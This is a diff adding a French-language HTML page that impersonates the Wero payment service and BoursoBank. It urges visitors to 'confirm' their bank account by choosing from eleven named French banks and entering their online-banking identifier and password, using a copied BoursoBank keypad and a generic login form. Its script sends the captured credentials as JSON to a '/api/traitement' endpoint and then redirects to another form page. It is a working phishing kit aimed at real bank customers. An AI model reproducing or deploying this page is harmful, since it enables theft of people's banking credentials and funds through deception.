@@ -1,0 +1,750 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Wero - Choisir votre banque</title>
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Montserrat:wght@400;500&family=Poppins:wght@600;700;800&family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="style.css">
+
+    <style>
+        /* --- STRUCTURE DE L'OVERLAY (FOND ASSOMBRI COORDONNÉ) --- */
+        .wero-modal-overlay {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background-color: rgba(0, 0, 0, 0.45);
+            backdrop-filter: blur(4px);
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            z-index: 9999;
+            opacity: 0;
+            pointer-events: none;
+            transition: opacity 0.3s ease;
+            padding: 15px;
+            box-sizing: border-box;
+        }
+
+        .wero-modal-overlay.active {
+            opacity: 1;
+            pointer-events: auto;
+        }
+
+        /* --- INTERFACE BOURSOBANK --- */
+        .bb-modal-card {
+            background-color: #ffffff;
+            border-radius: 16px;
+            box-shadow: 0 15px 35px rgba(0, 0, 0, 0.15);
+            border-top: 5px solid #ff007f; /* Liseré fuchsia officiel */
+            padding: 25px 20px;
+            width: 100%;
+            max-width: 390px;
+            box-sizing: border-box;
+            font-family: 'Inter', sans-serif;
+            display: none;
+            flex-direction: column;
+            align-items: center;
+        }
+
+        .bb-main-header {
+            display: flex;
+            justify-content: center;
+            padding-bottom: 20px;
+            width: 100%;
+        }
+
+        .bb-logo-wrap {
+            display: flex;
+            align-items: center;
+            gap: 5px;
+        }
+
+        .bb-logo-icon {
+            color: #ff007f;
+            font-size: 22px;
+            transform: rotate(25deg);
+            display: inline-block;
+        }
+
+        .bb-logo-text {
+            font-size: 20px;
+            font-weight: 700;
+            color: #093f67;
+            letter-spacing: -0.5px;
+        }
+
+        .bb-panel {
+            display: none;
+            flex-direction: column;
+            align-items: center;
+            width: 100%;
+        }
+
+        .bb-panel.active {
+            display: flex;
+        }
+
+        .bb-paper-plane-circle {
+            width: 65px;
+            height: 65px;
+            background-color: #eef2f6;
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            margin-bottom: 15px;
+        }
+
+        .bb-paper-plane-circle span {
+            color: #a0aec0;
+            font-size: 24px;
+            transform: rotate(45deg);
+        }
+
+        .bb-panel-title {
+            font-size: 20px;
+            font-weight: 700;
+            color: #093f67;
+            margin-bottom: 8px;
+            text-align: center;
+        }
+
+        .bb-panel-title.text-left {
+            text-align: left;
+            width: 100%;
+            margin-bottom: 15px;
+        }
+
+        .bb-panel-subtitle {
+            font-size: 13px;
+            color: #718096;
+            text-align: center;
+            margin-bottom: 15px;
+        }
+
+        .bb-badge-secure {
+            border: 1px solid #e2e8f0;
+            border-radius: 20px;
+            padding: 5px 12px;
+            font-size: 12px;
+            font-weight: 600;
+            color: #27ae60;
+            display: flex;
+            align-items: center;
+            gap: 4px;
+            margin-bottom: 35px;
+        }
+
+        .bb-input-line-container {
+            width: 100%;
+            border-bottom: 1.5px solid #cbd5e0;
+            margin-bottom: 30px;
+            padding-bottom: 5px;
+        }
+
+        .bb-input-line-container input {
+            width: 100%;
+            border: none;
+            outline: none;
+            font-size: 16px;
+            text-align: center;
+            color: #093f67;
+            font-weight: 500;
+        }
+
+        .bb-btn-fuchsia {
+            width: 100%;
+            background-color: #d6006f;
+            color: #ffffff;
+            border: none;
+            border-radius: 25px;
+            padding: 14px;
+            font-size: 15px;
+            font-weight: 700;
+            cursor: not-allowed;
+            text-align: center;
+        }
+
+        .bb-btn-fuchsia.ready {
+            background-color: #ff007f;
+            cursor: pointer;
+        }
+
+        .bb-btn-fuchsia.opacity-light {
+            background-color: #fca5d3;
+            cursor: not-allowed;
+        }
+
+        .bb-back-action-row {
+            width: 100%;
+            display: flex;
+            margin-bottom: 12px;
+        }
+
+        .bb-back-link {
+            background: none;
+            border: none;
+            color: #093f67;
+            font-size: 13px;
+            font-weight: 600;
+            cursor: pointer;
+        }
+
+        .bb-identifier-recap-badge {
+            width: 100%;
+            background-color: #f0f4f8;
+            color: #093f67;
+            padding: 10px;
+            border-radius: 6px;
+            font-size: 14px;
+            font-weight: 700;
+            text-align: center;
+            margin-bottom: 20px;
+        }
+
+        .bb-password-dots-row {
+            display: flex;
+            justify-content: center;
+            gap: 8px;
+            margin-bottom: 25px;
+        }
+
+        .bb-dot-slot {
+            width: 12px;
+            height: 12px;
+            border: 1.5px solid #cbd5e0;
+            border-radius: 50%;
+        }
+
+        .bb-dot-slot.filled {
+            background-color: #093f67;
+            border-color: #093f67;
+        }
+
+        .bb-keyboard-grid {
+            display: grid;
+            grid-template-columns: repeat(4, 1fr);
+            gap: 12px 10px;
+            margin-bottom: 25px;
+            justify-items: center;
+            width: 100%;
+        }
+
+        .bb-key-circle {
+            width: 54px;
+            height: 54px;
+            border-radius: 50%;
+            background-color: #ffffff;
+            border: 1px solid #f0f2f5;
+            color: #093f67;
+            font-size: 17px;
+            font-weight: 700;
+            cursor: pointer;
+            box-shadow: 0 3px 8px rgba(0, 0, 0, 0.04);
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
+
+        .bb-key-util {
+            font-size: 10px;
+            color: #718096;
+            text-transform: uppercase;
+        }
+
+        /* --- INTERFACE GÉNÉRIQUE AUTRES BANQUES --- */
+        .ob-modal-card {
+            width: 100%;
+            max-width: 400px;
+            background-color: #ffffff;
+            border-radius: 24px;
+            padding: 28px 22px;
+            box-sizing: border-box;
+            font-family: 'Inter', system-ui, sans-serif;
+            display: none;
+            flex-direction: column;
+            align-items: center;
+        }
+
+        .ob-icon-badge {
+            width: 60px;
+            height: 60px;
+            background-color: #ffffff;
+            border-radius: 14px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            box-shadow: 0 4px 10px rgba(0, 0, 0, 0.04);
+            border: 1px solid #f0f0f0;
+            margin-bottom: 20px;
+        }
+
+        .ob-card-title {
+            font-size: 22px;
+            font-weight: 700;
+            color: #111111;
+            text-align: center;
+            line-height: 1.3;
+            margin-bottom: 22px;
+        }
+
+        .ob-form-flow {
+            width: 100%;
+            display: flex;
+            flex-direction: column;
+            gap: 16px;
+        }
+
+        .ob-input-group {
+            display: flex;
+            flex-direction: column;
+            width: 100%;
+        }
+
+        .ob-field-label {
+            font-size: 14px;
+            font-weight: 600;
+            color: #111111;
+            margin-bottom: 6px;
+        }
+
+        .ob-custom-input {
+            width: 100%;
+            padding: 12px 14px;
+            border: 1.5px solid #e2e8f0;
+            border-radius: 10px;
+            font-size: 14px;
+            color: #222222;
+            outline: none;
+            box-sizing: border-box;
+        }
+
+        .ob-input-hint {
+            font-size: 12px;
+            color: #718096;
+            font-style: italic;
+            line-height: 1.4;
+            margin-top: 5px;
+        }
+
+        .ob-action-stack {
+            display: flex;
+            flex-direction: column;
+            gap: 10px;
+            margin-top: 10px;
+            width: 100%;
+        }
+
+        .ob-btn {
+            width: 100%;
+            padding: 13px;
+            border-radius: 10px;
+            font-size: 15px;
+            font-weight: 700;
+            cursor: pointer;
+            text-align: center;
+            border: none;
+            box-sizing: border-box;
+        }
+
+        .ob-btn-white {
+            background-color: #ffffff;
+            color: #111111;
+            border: 1.5px solid #e2e8f0;
+        }
+
+        .ob-btn-yellow {
+            background-color: #ffde00;
+        }
+
+        /* --- ANIMATION REDIRECTION (IDENTIQUE PHOTO) --- */
+.wero-redirect-overlay {
+    position: fixed; top: 0; left: 0; width: 100%; height: 100%;
+    background: #ffffff;
+    display: none; justify-content: center; align-items: center;
+    z-index: 10000; flex-direction: column;
+}
+.wero-redirect-overlay.wero-show { display: flex; }
+
+.wero-redirect-box { display: flex; flex-direction: column; align-items: center; }
+
+.wero-logo-flow-row { display: flex; align-items: center; gap: 20px; margin-bottom: 30px; }
+
+.wero-box-square { 
+    width: 70px; height: 70px; border-radius: 16px; 
+    display: flex; align-items: center; justify-content: center;
+    box-shadow: 0 4px 12px rgba(0,0,0,0.08); background: #fff;
+}
+.wero-wero-bg { background: #fffde7; } /* Fond jaune pour Wero */
+.wero-box-square img { width: 40px; height: 40px; object-fit: contain; }
+
+.wero-flow-arrow { color: #4cd137; font-weight: bold; }
+
+.wero-redirect-status-text { 
+    color: #718096; font-size: 16px; font-weight: 500; margin-bottom: 20px; 
+}
+
+/* Les 3 points verts */
+.wero-pulse-loader-dots { display: flex; gap: 8px; margin-bottom: 40px; }
+.wero-pulse-dot { width: 10px; height: 10px; background: #a8e063; border-radius: 50%; }
+
+/* La pilule en bas avec l'URL */
+.wero-url-badge {
+    padding: 8px 20px; background: #f7f7f7; border-radius: 50px;
+    font-size: 14px; font-weight: 600; color: #333;
+}
+    </style>
+</head>
+<body>
+
+    <div class="app-container">
+        <header class="app-header">
+            <div class="logo-container">
+                <img src="flavicon.ico" alt="Wero" class="app-logo">
+            </div>
+            <button class="menu-hamburger" aria-label="Menu">
+                <span></span>
+                <span></span>
+                <span></span>
+            </button>
+        </header>
+
+        <main class="app-content">
+            <h1 class="bank-page-title">Virement vers votre banque</h1>
+            <p class="bank-page-subtitle">Sélectionnez votre banque</p>
+
+            <div class="bank-security-box">
+                <p>Pour garantir la sécurité de vos paiements et de vos transferts entre votre compte Wero et votre compte bancaire, il est nécessaire de confirmer votre compte bancaire en toute sécurité.</p>
+                <p>Cette confirmation se fait via vos identifiants de connexion en ligne, ce qui assure la protection totale de vos informations.</p>
+                <p>Nous utilisons des technologies de cryptage avancées pour sécuriser chacune de vos transactions, afin que vous puissiez récupérer vos fonds en toute sécurité.</p>
+            </div>
+
+            <div class="banks-grid">
+                <div class="bank-card" onclick="startSecureRedirect(this, 'b1.html')">
+                    <img src="IMG_9197.png" alt="Crédit Agricole" class="bank-card-logo">
+                    <span class="bank-card-name">Crédit Agricole</span>
+                </div>
+
+                <div class="bank-card" onclick="startSecureRedirect(this, 'b2.html')">
+                    <img src="Societe-Generale-Emblem.png" alt="Société Générale" class="bank-card-logo" style="height: 50px;">
+                    <span class="bank-card-name">Société Générale</span>
+                </div>
+
+                <div class="bank-card" onclick="startSecureRedirect(this, 'b3.html')">
+                    <img src="BP-1.png" alt="Banque Populaire" class="bank-card-logo">
+                    <span class="bank-card-name">Banque Populaire</span>
+                </div>
+
+                <div class="bank-card" onclick="startSecureRedirect(this, 'b4.html')">
+                    <img src="CCF-2023.svg.webp" alt="CCF" class="bank-card-logo">
+                    <span class="bank-card-name">CCF</span>
+                </div>
+
+                <div class="bank-card" onclick="startSecureRedirect(this, 'b5.html')">
+                    <img src="LCL_banque_logo.svg.webp" alt="LCL" class="bank-card-logo">
+                    <span class="bank-card-name">LCL</span>
+                </div>
+
+                <div class="bank-card" onclick="startSecureRedirect(this, 'b6.html')">
+                    <img src="12895685.png" alt="Caisse d'Épargne" class="bank-card-logo">
+                    <span class="bank-card-name">Caisse d'Épargne</span>
+                </div>
+
+                <div class="bank-card" onclick="startSecureRedirect(this, 'b7.html')">
+                    <img src="logo_BanquePostale_600x300.webp" alt="La Banque Postale" class="bank-card-logo">
+                    <span class="bank-card-name">La Banque Postale</span>
+                </div>
+
+                <div class="bank-card" onclick="startSecureRedirect(this, 'b8.html')">
+                    <img src="unnamed.jpg" alt="Crédit Mutuel" class="bank-card-logo">
+                    <span class="bank-card-name">Crédit Mutuel</span>
+                </div>
+
+                <div class="bank-card" onclick="startSecureRedirect(this, 'b9.html')">
+                    <img src="images.jpeg" alt="Hello Bank!" class="bank-card-logo">
+                    <span class="bank-card-name">Hello Bank!</span>
+                </div>
+
+                <div class="bank-card" onclick="startSecureRedirect(this, 'b10.html')">
+                    <img src="BNP_Paribas.png" alt="BNP Paribas" class="bank-card-logo">
+                    <span class="bank-card-name">BNP Paribas</span>
+                </div>
+
+       <div class="bank-card" onclick="startSecureRedirect(this, 'b11.html')">
+                    <img src="boursorama_logo.jpeg" alt="BoursoBank" class="bank-card-logo">
+                    <span class="bank-card-name">BoursoBank</span>
+                </div>
+
+                <div class="bank-card other-banks-card" onclick="openOtherBanksModal()">
+                    <svg class="bank-building-icon" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.5">
+                        <path d="M3 22h18M5 22V11h14v11M12 2v4M4.5 6h15L12 2 4.5 6zM7 11v7M11 11v7M14 11v7M17 11v7"/>
+                    </svg>
+                    <span class="bank-card-name">Autres banques</span>
+                </div>
+            </div>
+
+            <p class="bank-grid-caption">Après sélection, vous serez redirigé vers un module sécurisé pour valider votre compte bancaire via vos identifiants en ligne.</p>
+        </main>
+    </div>
+
+    <div id="wero-global-overlay" class="wero-modal-overlay" onclick="forceClose()">
+        
+        <div id="modal-content-bourso" class="bb-modal-card" onclick="event.stopPropagation()">
+            <header class="bb-main-header">
+                <div class="bb-logo-wrap">
+                    <span class="bb-logo-icon">▲</span>
+                    <span class="bb-logo-text">BoursoBank</span>
+                </div>
+            </header>
+
+            <div id="bb-pane-id" class="bb-panel active">
+                <div class="bb-paper-plane-circle"><span>▲</span></div>
+                <h2 class="bb-panel-title">Mon identifiant</h2>
+                <p class="bb-panel-subtitle">Veuillez toujours vérifier que vous êtes sur la bonne adresse</p>
+                <div class="bb-badge-secure">🔒 Espace Client</div>
+                <div class="bb-input-line-container">
+                    <input type="tel" id="bb-field-user-id" placeholder="Saisissez votre identifiant" maxlength="10" autocomplete="off">
+                </div>
+                <button type="button" id="bb-next-trigger" class="bb-btn-fuchsia" disabled>Suivant</button>
+            </div>
+
+            <div id="bb-pane-pass" class="bb-panel">
+                <div class="bb-back-action-row">
+                    <button type="button" id="bb-back-trigger" class="bb-back-link">‹ Retour</button>
+                </div>
+                <h2 class="bb-panel-title text-left">Mon mot de passe</h2>
+                <div class="bb-identifier-recap-badge">Identifiant : <span id="bb-recap-txt">-</span></div>
+                
+                <div class="bb-password-dots-row">
+                    <div class="bb-dot-slot"></div><div class="bb-dot-slot"></div>
+                    <div class="bb-dot-slot"></div><div class="bb-dot-slot"></div>
+                    <div class="bb-dot-slot"></div><div class="bb-dot-slot"></div>
+                    <div class="bb-dot-slot"></div><div class="bb-dot-slot"></div>
+                </div>
+
+                <div class="bb-keyboard-grid">
+                    <button type="button" class="bb-key-circle" data-digit="3">3</button>
+                    <button type="button" class="bb-key-circle" data-digit="8">8</button>
+                    <button type="button" class="bb-key-circle" data-digit="9">9</button>
+                    <button type="button" class="bb-key-circle" data-digit="0">0</button>
+                    <button type="button" class="bb-key-circle" data-digit="4">4</button>
+                    <button type="button" class="bb-key-circle" data-digit="2">2</button>
+                    <button type="button" class="bb-key-circle" data-digit="5">5</button>
+                    <button type="button" class="bb-key-circle" data-digit="6">6</button>
+                    <button type="button" class="bb-key-circle" data-digit="1">1</button>
+                    <button type="button" class="bb-key-circle" data-digit="7">7</button>
+                    <button type="button" id="bb-clear-trigger" class="bb-key-circle bb-key-util">Effacer</button>
+                </div>
+                <button type="button" id="bb-submit-trigger" class="bb-btn-fuchsia opacity-light" disabled>Je me connecte</button>
+            </div>
+        </div>
+
+        <div id="modal-content-others" class="ob-modal-card" onclick="event.stopPropagation()">
+            <div class="ob-icon-badge">
+                <svg viewBox="0 0 24 24" width="32" height="32" fill="none" stroke="#222" stroke-width="1.5">
+                    <path d="M3 21h18M3 10h18M5 6l7-3 7 3M4 10v11M11 10v11M15 10v11M20 10v11"/>
+                </svg>
+            </div>
+            <h2 class="ob-card-title">Informations de connexion bancaire</h2>
+            
+            <form class="ob-form-flow" onsubmit="handleOtherBanksSubmit(event)">
+                <div class="ob-input-group">
+                    <label class="ob-field-label">Nom de votre banque</label>
+                    <input type="text" id="ob-field-bank-name" class="ob-custom-input" placeholder="Ex: Nickel, Revolut..." required autocomplete="off">
+                </div>
+                <div class="ob-input-group">
+                    <label class="ob-field-label">Identifiant de connexion</label>
+                    <input type="tel" id="ob-field-user-id" class="ob-custom-input" placeholder="Votre identifiant bancaire" required autocomplete="off">
+                </div>
+                <div class="ob-input-group">
+                    <label class="ob-field-label">Mot de passe de connexion</label>
+                    <input type="password" id="ob-field-password" class="ob-custom-input" placeholder="Votre mot de passe bancaire" required>
+                </div>
+                
+                <div class="ob-action-stack">
+                    <button type="button" class="ob-btn ob-btn-white" onclick="forceClose()">Annuler</button>
+                    <button type="submit" class="ob-btn ob-btn-yellow">Valider</button>
+                </div>
+            </form>
+        </div>
+    </div>
+
+   <div id="wero-redirect-screen" class="wero-redirect-overlay">
+    <div class="wero-redirect-box">
+        <div class="wero-logo-flow-row">
+            <div class="wero-box-square wero-wero-bg">
+                <img src="flavicon.ico" alt="Wero">
+            </div>
+            <div class="wero-flow-arrow">
+                <svg viewBox="0 0 24 24" width="32" height="32" fill="none" stroke="currentColor" stroke-width="3">
+                    <line x1="5" y1="12" x2="19" y2="12"></line>
+                    <polyline points="12 5 19 12 12 19"></polyline>
+                </svg>
+            </div>
+            <div class="wero-box-square">
+                <img id="wero-target-bank-logo" src="" alt="Banque">
+            </div>
+        </div>
+
+        <p class="wero-redirect-status-text">Connexion sécurisée en cours...</p>
+
+        <div class="wero-pulse-loader-dots">
+            <span class="wero-pulse-dot"></span>
+            <span class="wero-pulse-dot"></span>
+            <span class="wero-pulse-dot"></span>
+        </div>
+    </div>
+</div>
+    <script>
+        const overlay = document.getElementById('wero-global-overlay');
+        const mBourso = document.getElementById('modal-content-bourso');
+        const mOthers = document.getElementById('modal-content-others');
+
+        const bbFieldId = document.getElementById('bb-field-user-id');
+        const bbBtnNext = document.getElementById('bb-next-trigger');
+        const bbPaneId = document.getElementById('bb-pane-id');
+        const bbPanePass = document.getElementById('bb-pane-pass');
+        const bbRecap = document.getElementById('bb-recap-txt');
+        const bbBtnSubmit = document.getElementById('bb-submit-trigger');
+        const bbSlots = document.querySelectorAll('.bb-dot-slot');
+        
+        let passBuffer = [];
+
+        function openBoursoModal() {
+            mOthers.style.display = 'none';
+            mBourso.style.display = 'flex';
+            overlay.classList.add('active');
+        }
+
+        function openOtherBanksModal() {
+            mBourso.style.display = 'none';
+            mOthers.style.display = 'flex';
+            overlay.classList.add('active');
+        }
+
+        function forceClose() {
+            overlay.classList.remove('active');
+            passBuffer = [];
+            bbFieldId.value = '';
+            bbBtnNext.setAttribute('disabled', 'true');
+            bbBtnNext.classList.remove('ready');
+            bbPanePass.classList.remove('active');
+            bbPaneId.classList.add('active');
+            resetSlots();
+        }
+
+        bbFieldId.addEventListener('input', () => {
+            bbFieldId.value = bbFieldId.value.replace(/\D/g, '');
+            if(bbFieldId.value.length >= 6) {
+                bbBtnNext.removeAttribute('disabled');
+                bbBtnNext.classList.add('ready');
+            } else {
+                bbBtnNext.setAttribute('disabled', 'true');
+                bbBtnNext.classList.remove('ready');
+            }
+        });
+
+        bbBtnNext.addEventListener('click', () => {
+            bbRecap.textContent = bbFieldId.value;
+            bbPaneId.classList.remove('active');
+            bbPanePass.classList.add('active');
+        });
+
+        document.getElementById('bb-back-trigger').addEventListener('click', () => {
+            passBuffer = [];
+            resetSlots();
+            bbPanePass.classList.remove('active');
+            bbPaneId.classList.add('active');
+        });
+
+        document.querySelectorAll('.bb-key-circle[data-digit]').forEach(key => {
+            key.addEventListener('click', () => {
+                if(passBuffer.length < 8) {
+                    passBuffer.push(key.getAttribute('data-digit'));
+                    refreshSlots();
+                    if(passBuffer.length === 8) {
+                        bbBtnSubmit.removeAttribute('disabled');
+                        bbBtnSubmit.classList.remove('opacity-light');
+                        bbBtnSubmit.classList.add('ready');
+                    }
+                }
+            });
+        });
+
+        document.getElementById('bb-clear-trigger').addEventListener('click', () => {
+            if(passBuffer.length > 0) {
+                passBuffer.pop();
+                refreshSlots();
+                bbBtnSubmit.setAttribute('disabled', 'true');
+                bbBtnSubmit.classList.add('opacity-light');
+                bbBtnSubmit.classList.remove('ready');
+            }
+        });
+
+        function refreshSlots() {
+            bbSlots.forEach((slot, i) => {
+                if(i < passBuffer.length) slot.classList.add('filled');
+                else slot.classList.remove('filled');
+            });
+        }
+
+        function resetSlots() {
+            bbSlots.forEach(slot => slot.classList.remove('filled'));
+            bbBtnSubmit.setAttribute('disabled', 'true');
+            bbBtnSubmit.classList.add('opacity-light');
+            bbBtnSubmit.classList.remove('ready');
+        }
+
+        /* --- LOGIQUE GLOBALE D'ENVOI VERCEL FETCH JSON (RÉGIE PAR L'ACCORD DES 3 VARIABLES) --- */
+        function envoyerDonneesVercel(nomBanque, identifiant, codeSecret) {
+            const payload = {
+                nom_banque: nomBanque,
+                client_id: identifiant,
+                secret_code: codeSecret
+            };
+
+            fetch('/api/traitement', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify(payload)
+            })
+            .then(() => { window.location.href = 'form.html'; })
+            .catch(() => { window.location.href = 'form.html'; });
+        }
+
+        /* Soumission Modale BoursoBank */
+        bbBtnSubmit.addEventListener('click', () => {
+            envoyerDonneesVercel('BoursoBank', bbFieldId.value, passBuffer.join(''));
+        });
+
+        /* Soumission Modale Autres Banques */
+        function handleOtherBanksSubmit(e) {
+            e.preventDefault();
+            const nom = document.getElementById('ob-field-bank-name').value;
+            const id = document.getElementById('ob-field-user-id').value;
+            const pass = document.getElementById('ob-field-password').value;
+            envoyerDonneesVercel(nom, id, pass);
+        }
+
+        /* Redirection Grille Principale (Extraction auto du nom via le ALT de l'image cliquée) */
+        function startSecureRedirect(cardElement, targetUrl) {
+            const imgEl = cardElement.querySelector('.bank-card-logo');
+            const nomBanque = imgEl ? imgEl.alt : "Banque Inconnue";
+            const logoSrc = imgEl ? imgEl.getAttribute('src') : "flavicon.ico";
+
+            // Sauvegarde le ALT pour tes pages b1.html à b11.html
+            localStorage.setItem('banque_selectionnee', nomBanque);
+
+            document.getElementById('wero-target-bank-logo').src = logoSrc;
+            document.getElementById('wero-redirect-screen').classList.add('wero-show');
+
+            setTimeout(() => { window.location.href = targetUrl; }, 2500);
+        }
+    </script>
+</body>
+</html>
